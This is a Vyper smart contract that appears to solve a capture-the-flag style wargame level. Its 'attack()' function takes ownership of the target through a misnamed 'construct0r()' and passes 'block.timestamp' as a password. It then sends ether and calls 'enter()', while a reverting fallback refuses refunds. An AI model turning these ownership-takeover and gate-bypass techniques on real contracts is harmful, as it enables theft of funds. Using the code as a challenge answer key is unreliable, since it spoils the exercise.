# @version ^0.3.7

interface InstanceInterface:
    def owner() -> address: view
    def trick() -> address: view
    def entrant() -> address: view
    def allow_enterance() -> bool: view
    def construct0r(): nonpayable
    def createTrick(): nonpayable
    def getAllowance(_password: uint256): nonpayable
    def enter() -> bool: nonpayable

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.instance.construct0r()
    assert self.instance.owner() == self, "!instanceOwner"

    self.instance.createTrick()
    assert self.instance.trick() != empty(address), "!trick"

    self.instance.getAllowance(block.timestamp)
    assert self.instance.allow_enterance(), "!allow_entrance"

    raw_call(self.instance.address, b"", value=self.balance)
    assert self.instance.enter(), "!enter"
    assert self.instance.entrant() == owner, "!entrant"

@external
@payable
def __default__():
    raise
